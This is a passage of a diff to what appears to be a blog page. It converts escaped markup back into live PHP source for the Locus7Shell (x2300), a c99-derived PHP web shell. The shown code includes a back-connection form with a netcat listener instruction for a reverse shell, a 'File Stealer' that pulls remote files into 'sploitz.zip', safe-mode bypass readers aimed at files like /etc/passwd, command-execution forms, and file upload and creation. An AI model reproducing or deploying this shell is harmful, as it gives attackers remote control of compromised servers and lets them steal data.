-   &lt;b&gt;Back-Connection :&lt;/b&gt;&lt;/br&gt;&lt;form action="&lt;?php echo $surl;?&gt;"&gt; &lt;b&gt;Ip (default is your ip) :&lt;/br&gt; &lt;/b&gt;&lt;input type=hidden name=act value=tools&gt;&lt;input type="text" name="ipi" value="&lt;?echo getenv('REMOTE_ADDR');?&gt;"&gt;&lt;/br&gt;&lt;b&gt;Port:&lt;/br&gt;&lt;/b&gt;&lt;input type="text" name="pipi" value="4392"&gt;&lt;/br&gt;&lt;input type="submit" value="C0nnect -&gt;"&gt;&lt;/br&gt;&lt;/form&gt;
-Click "Connect" only after open port for it. You should use NetCat&copy;, run "&lt;b&gt;nc -l -n -v -p &lt;?php echo $bc_port; ?&gt;&lt;/b&gt;"!&lt;br&gt;&lt;br&gt;
+   &lt;b&gt;Back-Connection :&lt;/b&gt;&lt;/br&gt;&lt;form action="<?php echo $surl;?>"&gt; &lt;b&gt;Ip (default is your ip) :&lt;/br&gt; &lt;/b&gt;&lt;input type=hidden name=act value=tools&gt;&lt;input type="text" name="ipi" value="<?echo getenv('REMOTE_ADDR');?>"&gt;&lt;/br&gt;&lt;b&gt;Port:&lt;/br&gt;&lt;/b&gt;&lt;input type="text" name="pipi" value="4392"&gt;&lt;/br&gt;&lt;input type="submit" value="C0nnect -&gt;"&gt;&lt;/br&gt;&lt;/form&gt;
+Click "Connect" only after open port for it. You should use NetCat&copy;, run "&lt;b&gt;nc -l -n -v -p <?php echo $bc_port; ?>&lt;/b&gt;"!&lt;br&gt;&lt;br&gt;
    
    &lt;/center&gt;
     &lt;/td&gt;
 &lt;/tr&gt;&lt;/TABLE&gt;
 &lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="&lt;?php echo $surl; ?&gt;act=cmd&d=&lt;?php echo urlencode($d); ?&gt;"&gt;&lt;b&gt;File Stealer Function Ripped fRom Tontonq 's File Stealer ... &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"&gt;&lt;b&gt;File Stealer Function Ripped fRom Tontonq 's File Stealer ... &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
     &lt;div align="center"&gt;&lt;b&gt;Safe_Mode Bypass&lt;/b&gt;
-    &lt;form action="&lt;?php echo $surl; ?&gt;" method="POST"&gt;
+    &lt;form action="<?php echo $surl; ?>" method="POST"&gt;
     &lt;input type=hidden name=act value=tools&gt;
     &lt;textarea name="erorr" cols=100 rows=10&gt;&lt;/textarea&gt;&lt;/br&gt;
-    &lt;input type="text" name="nere" value="&lt;?echo "$real\index.php";?&gt; "size=84&gt;
+    &lt;input type="text" name="nere" value="<?echo "$real\index.php";?> "size=84&gt;
     &lt;input type="submit" value="Write 2 File !!"&gt;
     
     &lt;/form&gt;
@@ -2489,10 +2489,10 @@ Click "Connect" only after open port for it. You should use NetCat&copy;, run "&
     &lt;/td&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
    &lt;center&gt;
-   &lt;form action="&lt;?php echo $surl; ?&gt;" method="POST"&gt;
+   &lt;form action="<?php echo $surl; ?>" method="POST"&gt;
    &lt;input type=hidden name=act value=tools&gt;
    Dosyanin Adresi ? = &lt;input type="text" name="dosyaa" size="81" maxlength=500  value=""&gt;&lt;br&gt;&lt;br&gt;
-Nereya Kaydolcak? = &lt;input type="text" name="yeniyer" size=81 maxlength=191 value="&lt;?php echo "$real/sploitz.zip"; ?&gt;"&gt;&lt;br&gt;&lt;br&gt;
+Nereya Kaydolcak? = &lt;input type="text" name="yeniyer" size=81 maxlength=191 value="<?php echo "$real/sploitz.zip"; ?>"&gt;&lt;br&gt;&lt;br&gt;
 &lt;input type=submit class='stealthSubmit' Value='Dosyayi Chek'&gt;
 &lt;/form&gt;
 &lt;br&gt;&lt;br&gt;&lt;br&gt;
@@ -2505,7 +2505,7 @@ Nereya Kaydolcak? = &lt;input type="text" name="yeniyer" size=81 maxlength=191 v
    &lt;/center&gt;
     &lt;/td&gt;
 &lt;/tr&gt;&lt;/TABLE&gt;
-&lt;?php
+<?php
 if (isset($_POST['dosyaa']))
 {
 dosyayicek($_POST['dosyaa'],$_POST['yeniyer']);
@@ -3301,12 +3301,12 @@ Bind Port: &lt;input type='text' name='backconnectport' value='5992'&gt;
 echo("$msg");
 echo("$emsg");
 echo("&lt;/center&gt;");
-} ?&gt;
+} ?>
 
 
 &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;a bookmark="minipanel"&gt;&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
 &lt;tr&gt;&lt;td width="100%" height="1" valign="top" colspan="2"&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Enter: &lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type="text" name="cmd" size="50" value="&lt;?php echo htmlspecialchars($cmd); ?&gt;"&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Select: &lt;/b&gt;&lt;form action="&lt;?php echo $surl; ?&gt;act=cmd" method="POST"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;select name="cmd"&gt;&lt;?php foreach ($cmdaliases as $als) {echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";} ?&gt;&lt;/select&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/TABLE&gt;
+&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Enter: &lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Select: &lt;/b&gt;&lt;form action="<?php echo $surl; ?>act=cmd" method="POST"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;select name="cmd"&gt;<?php foreach ($cmdaliases as $als) {echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";} ?>&lt;/select&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/TABLE&gt;
 &lt;br&gt;
 &lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
 &lt;tr&gt;&lt;td height="1" valign="top" colspan="2"&gt;&lt;/td&gt;&lt;/tr&gt;
@@ -3314,10 +3314,10 @@ echo("&lt;/center&gt;");
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
     &lt;div align="center"&gt;Useful Commands  
     &lt;/div&gt;
-    &lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
+    &lt;form action="<?php echo $surl; ?>"&gt;
       &lt;div align="center"&gt;
         &lt;input type=hidden name=act value="cmd"&gt;
-        &lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
+        &lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;
           &lt;SELECT NAME="cmd"&gt;
             &lt;OPTION VALUE="uname -a"&gt;Kernel version
               &lt;OPTION VALUE="w"&gt;Logged in users
@@ -3359,7 +3359,7 @@ echo("&lt;/center&gt;");
     &lt;/td&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
    &lt;center&gt;Kernel Info: &lt;form name="form1" method="post" action="http://google.com/search"&gt;
-      &lt;input name="q" type="text" id="q" size="80" value="&lt;?php echo wordwrap(php_uname()); ?&gt;"&gt;
+      &lt;input name="q" type="text" id="q" size="80" value="<?php echo wordwrap(php_uname()); ?>"&gt;
       &lt;input type="hidden" name="client" value="firefox-a"&gt;
       &lt;input type="hidden" name="rls" value="org.mozilla:en-US:official"&gt;
       &lt;input type="hidden" name="hl" value="en"&gt;
@@ -3374,7 +3374,7 @@ echo("&lt;/center&gt;");
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
     &lt;div align="center"&gt;Php Safe-Mode Bypass (Read Files)
     &lt;/div&gt;&lt;br&gt;
-    &lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
+    &lt;form action="<?php echo $surl; ?>"&gt;
       &lt;div align="center"&gt;
       File: &lt;input type="text" name="file" method="get"&gt; &lt;input type="submit" value="Read File"&gt;&lt;br&gt;&lt;br&gt; eg: /etc/passwd&lt;br&gt;
        
@@ -3383,7 +3383,7 @@ echo("&lt;/center&gt;");
             
        
        
-      &lt;?
+      <?
        
       function rsg_read()
     {    
@@ -3412,11 +3412,11 @@ echo("&lt;/center&gt;");
 rsg_read();
 }
      
-    ?&gt;
+    ?>
 
 
      
-    &lt;?
+    <?
      
     function rsg_glob()
 {
@@ -3433,13 +3433,13 @@ if(isset($_GET['directory']))
 {
 rsg_glob();
 }
-?&gt;
+?>
           &lt;br&gt;
       &lt;/div&gt;
     &lt;/form&gt;
     &lt;/td&gt;
   &lt;td width="50%" height="83" valign="top"&gt;&lt;center&gt;
-   &lt;center&gt;Php Safe-Mode Bypass (List Directories):     &lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
+   &lt;center&gt;Php Safe-Mode Bypass (List Directories):     &lt;form action="<?php echo $surl; ?>"&gt;
       &lt;div align="center"&gt;&lt;br&gt;
       Dir: &lt;input type="text" name="directory" method="get"&gt; &lt;input type="submit" value="List Directory"&gt;&lt;br&gt;&lt;br&gt; eg: /etc/&lt;br&gt;
     &lt;/form&gt;&lt;/center&gt;
@@ -3448,14 +3448,14 @@ rsg_glob();
 &lt;br&gt;
 &lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;
 &lt;tr&gt;
-&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Search&lt;form method="POST"&gt;&lt;input type=hidden name=act value="search"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type="text" name="search_name" size="29" value="(.*)"&gt;&nbsp;&lt;input type="checkbox" name="search_name_regexp" value="1"  checked&gt; - regexp&nbsp;&lt;input type=submit name=submit value="Search"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;
-&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Upload&lt;form method="POST" ENCTYPE="multipart/form-data"&gt;&lt;input type=hidden name=act value="upload"&gt;&lt;input type="file" name="uploadfile"&gt;&lt;input type=hidden name="miniform" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Upload"&gt;&lt;br&gt;&lt;?php echo $wdt; ?&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;
+&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Search&lt;form method="POST"&gt;&lt;input type=hidden name=act value="search"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="search_name" size="29" value="(.*)"&gt;&nbsp;&lt;input type="checkbox" name="search_name_regexp" value="1"  checked&gt; - regexp&nbsp;&lt;input type=submit name=submit value="Search"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;
+&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Upload&lt;form method="POST" ENCTYPE="multipart/form-data"&gt;&lt;input type=hidden name=act value="upload"&gt;&lt;input type="file" name="uploadfile"&gt;&lt;input type=hidden name="miniform" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Upload"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/table&gt;
-&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Make Dir&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type=hidden name=act value="mkdir"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type="text" name="mkdir" size="50" value="&lt;?php echo $dispd; ?&gt;"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;&lt;?php echo $wdt; ?&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Make File&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkfile"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type="text" name="mkfile" size="50" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type=hidden name="ft" value="edit"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;&lt;?php echo $wdt; ?&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Go Dir&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type=hidden name=act value="ls"&gt;&lt;input type="text" name="d" size="50" value="&lt;?php echo $dispd; ?&gt;"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Go File&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type=hidden name=act value="gofile"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type="text" name="f" size="50" value="&lt;?php echo $dispd; ?&gt;"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="990" height="1" valign="top"&gt;&lt;p align="center"&gt;&lt;b&gt;--[ x2300 Locus7Shell v. &lt;?php echo $shver; ?&gt; &lt;a href="http://www.locus7s.com/"&gt;&lt;u&gt;&lt;b&gt;Modded by&lt;/b&gt;&lt;/u&gt;&lt;/a&gt; #!physx^  | &lt;a href="http://www.locus7s.com"&gt;www.LOCUS7S.com&lt;/font&gt;&lt;/a&gt;&lt;font color="#FF0000"&gt;&lt;/font&gt; | Generation time: &lt;?php echo round(getmicrotime()-starttime,4); ?&gt; ]--&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/body&gt;&lt;/html&gt;&lt;?php chdir($lastdir); c99shexit(); ?&gt;
-</pre>
+&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Make Dir&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="mkdir"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Make File&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkfile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"&gt;&lt;input type=hidden name="ft" value="edit"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Go Dir&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="ls"&gt;&lt;input type="text" name="d" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;Go File&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type=hidden name=act value="gofile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="f" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="990" height="1" valign="top"&gt;&lt;p align="center"&gt;&lt;b&gt;--[ x2300 Locus7Shell v. <?php echo $shver; ?> &lt;a href="http://www.locus7s.com/"&gt;&lt;u&gt;&lt;b&gt;Modded by&lt;/b&gt;&lt;/u&gt;&lt;/a&gt; #!physx^  | &lt;a href="http://www.locus7s.com"&gt;www.LOCUS7S.com&lt;/font&gt;&lt;/a&gt;&lt;font color="#FF0000"&gt;&lt;/font&gt; | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;<?php chdir($lastdir); c99shexit(); ?>
+{% endhighlight %}
 
  [1]: http://www.petitiononline.com/locus7s/petition.html "Locus7s petition"
